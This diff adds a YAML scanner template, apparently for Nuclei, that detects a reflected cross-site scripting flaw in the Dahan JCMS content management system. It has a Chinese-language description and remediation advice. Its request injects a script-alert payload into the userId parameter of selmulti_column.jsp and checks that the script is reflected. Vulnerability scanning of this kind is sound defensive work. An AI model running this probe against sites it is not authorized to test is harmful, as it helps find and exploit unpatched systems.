@@ -1,0 +1,32 @@
+id: JCMS-M_5_b-XSS
+info:
+  name: 大汉JCMS系统XSS跨站漏洞
+  author:
+  - l0ne1y
+  description: |-
+    大汉JCMS selmulti_column.jsp 跨站脚本漏洞
+    大汉JCMS是一款内容管理系统，基于J2EE构架设计。系统提供了从内容采集、创建、管理、传递、发布、共享呈送等信息全生命周期过程中所需的各项功能。
+
+    大汉JCMS存在跨站脚本漏洞，该漏洞源于程序没有正确的过滤用户提交的输入。远程攻击者可利用该漏洞在用户浏览器中执行任意脚本代码。
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.hanweb.com/
+
+    临时修复方案：
+    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,"<script>alert(/test/)</script>")
+    - '!contains(body,"type=1&userId=2222222")'
+  path:
+  - '{{BaseURL}}/jcms/m_5_b/selmulti_column.jsp?type=1&userId=2222222%2b><script>alert(/test/)</script>'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
